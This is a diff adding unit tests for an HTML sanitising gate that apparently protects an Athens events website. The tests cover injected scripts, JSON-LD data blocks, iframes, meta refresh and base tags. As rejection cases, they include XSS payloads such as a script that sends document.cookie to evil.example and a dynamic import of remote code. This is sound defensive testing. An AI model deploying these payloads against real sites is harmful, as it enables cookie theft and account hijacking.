@@ -84,6 +84,57 @@ describe('scripts', () => {
   });
 });
 
+describe('inline scripts: only the templates\' own, by hash', () => {
+  test('an injected inline script fails', () => {
+    fails(page('<p>Jazz</p><script data-pwn>alert(1)</script>'));
+    fails(page('<script>fetch("//evil.example/"+document.cookie)</script>'));
+    fails(page('<script type="module">import("//evil.example/x.js")</script>'));
+    fails(page('<script type="text/javascript">x()</script>'));
+  });
+  test('a template script with one character changed fails', () => {
+    const body = renderAnalytics().match(/<script>([\s\S]*?)<\/script>/)![1];
+    fails(page(`<script>${body} </script>`));
+  });
+  test('the analytics bootstrap passes unchanged', () => passes(page('', renderAnalytics())));
+});
+
+describe('JSON data blocks', () => {
+  const ld = (json: string) => `<html><head><script type="application/ld+json">${json}</script></head><body></body></html>`;
+  test('a block that does not parse fails', () => fails(ld('{"@type":"Event","name":"A"')));
+  test('markup inside a block fails', () => {
+    fails(ld('{"@type":"Event","name":"<!--"}'));
+    fails(ld('{"@type":"Event","name":"<script"}'));
+  });
+  test('a script URL under a URL-valued key fails; the same text in prose is inert and passes', () => {
+    fails(ld('{"@type":"Event","location":{"@type":"Place","sameAs":"javascript:alert(1)"}}'));
+    fails(ld('{"@type":"Event","image":[" vbscript:x"]}'));
+    passes(ld('{"@type":"Place","address":{"streetAddress":"javascript:alert(1)"}}'));
+  });
+  test('"<!--" inside a plain JSON data block fails', () => {
+    fails('<html><head><script type="application/json">{"a":"<!--"}</script></head><body></body></html>');
+  });
+  test('ordinary JSON-LD passes', () => passes(ld('{"@type":"Event","name":"Jazz \\u003cb\\u003e","url":"https://agentathens.com/events/a/"}')));
+});
+
+describe('frames, refresh, plugins and base', () => {
+  for (const bad of [
+    '<iframe src="https://evil.example/"></iframe>',
+    '<iframe src="https://www.openstreetmap.org.evil.example/export/embed.html?bbox=1"></iframe>',
+    '<iframe></iframe>',
+    '<IFRAME SRC=https://evil.example/></IFRAME>',
+    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
+    '<meta HTTP-EQUIV=Refresh content="0;url=https://evil.example/">',
+    '<object data="https://evil.example/x.swf"></object>',
+    '<embed src="https://evil.example/x.swf">',
+    '<base href="https://evil.example/">',
+  ]) test(`fails: ${bad.slice(0, 60)}`, () => fails(page(bad)));
+
+  test('the venue-page OpenStreetMap embed passes', () => {
+    passes(page('<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=23.7,37.9,23.8,38.0&amp;marker=37.95,23.75" loading="lazy" title="Map"></iframe>'));
+  });
+  test('an ordinary meta http-equiv passes', () => passes(page('', '<meta http-equiv="X-UA-Compatible" content="IE=edge">')));
+});
+
 describe('real templates pass the gate', () => {
   test('event detail page (el + en) and a card', () => {
     const e = { ...sampleConcert, startDate: '2099-01-01T21:00:00+02:00', endDate: undefined, ticketUrl: 'https://www.viva.gr/tickets/x/?a=1&b=2', ticketUrlStatus: 'direct' as const, imageUrl: 'https://cdn.example.com/a.jpg?w=1&amp;h=2' };
